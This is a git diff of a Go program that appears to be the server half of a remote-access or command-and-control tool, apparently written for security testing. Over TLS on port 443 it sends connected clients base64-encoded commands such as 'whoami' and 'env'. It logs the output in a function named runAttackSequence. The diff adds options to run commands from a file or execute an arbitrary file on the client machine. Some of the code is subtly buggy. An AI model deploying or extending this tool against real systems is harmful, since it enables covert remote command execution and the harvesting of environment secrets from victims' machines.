@@ -6,7 +6,8 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
-	"errors"
+
+	// "errors"
 	"fmt"
 	"io"
 	"log"
@@ -48,14 +49,14 @@ func downloadFile(conn *tls.Conn, path string) {
 }
 
 func main() {
-	var cmdsToRun = []string{ "echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"}
+	var cmdsToRun = []string{"echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"}
 	arguments := os.Args
 	if len(arguments) < 2 {
 		fmt.Println("Filename missing. Exiting.")
 		os.Exit(1)
 	}
-
-	var PORT  string
+	checkFlags(arguments, len(arguments), cmdsToRun)
+	var PORT string
 	PORT = "443"
 
 	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
@@ -70,9 +71,9 @@ func main() {
 	if err != nil {
 		log.Fatalf("Server Listen: %s", err)
 	}
-	fmt.Println("Server Listening on port: ",PORT)
+	fmt.Println("Server Listening on port: ", PORT)
 	for {
-		
+
 		conn, err := listener.Accept()
 		if err != nil {
 			log.Printf("Client accept error: %s", err)
@@ -119,7 +120,7 @@ func readFile(filePathName string) ([]string, int) {
 
 }
 func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
-	file, err := os.OpenFile(conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)).String()+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	file, err := os.OpenFile(conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -130,19 +131,59 @@ func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
 	disconnectClient(conn, logger, *file)
 }
 
+func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
+	switch arguments[1] {
+	case "-a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
+		return false
+	case "-fe": //run commands from file
+		if l != 3{
+			fmt.Println("No filename specified.")
+			os.Exit(1)
+		}
+		//check if filepath exists
+		if _, err := os.Stat("sample.txt"); err == nil {
+			fmt.Printf("File exists\n");
+		 } else {
+			fmt.Printf("File does not exist\n");
+			os.Exit(1)
+		 }
+		cmdsToRun, _ = readFile(arguments[2])
+		break
+	case "-fue":
+		if l != 3{
+			fmt.Println("No filename specified.")
+			os.Exit(1)
+		}
+		//check if filepath exists
+		if _, err := os.Stat("sample.txt"); err == nil {
+			//do nothing, continue
+		 } else {
+			fmt.Printf("Filepath does not exist\n");
+			os.Exit(1)
+		 }
+		return true
+	default:
+		fmt.Printf("'%s' is not a listed command, please choose from the following: \n", arguments[1])
+		fmt.Println("-a : Run \"echo $ARAALI_COUNT\", \"uname -a\", \"whoami\", \"pwd\", \"env\"")
+		fmt.Println("-fe : Run commands from a file specified as argument 3")
+		fmt.Println("-fue : Run an executable file on the client system, specified as argument 3")
+		os.Exit(1)
+	}
+	return false
+
+}
+
 func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	logger.Println("FILE BEGINS HERE.")
-	//attack
 	buffer := make([]byte, 1024)
 	for index, element := range cmdsToRun {
-
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
 		conn.Write([]byte(encodedStr))
-		logger.Println("EXECUTE: "+element)
+		logger.Println("EXECUTE: " + string(index) + " " + element)
 		time.Sleep(time.Second)
-		res, err := connection.Read(buffer)
-		logger.Println("RES: "+ res)
-		logger.Println("ERR: "+ err)
+		_, err := conn.Read(buffer)
+		logger.Println("RES: " + string(buffer[:]))
+		logger.Println("ERR: " + err.Error())
 		handleError(err)
 	}
 	logger.Println("\nDONE.\nFILE ENDS HERE.")
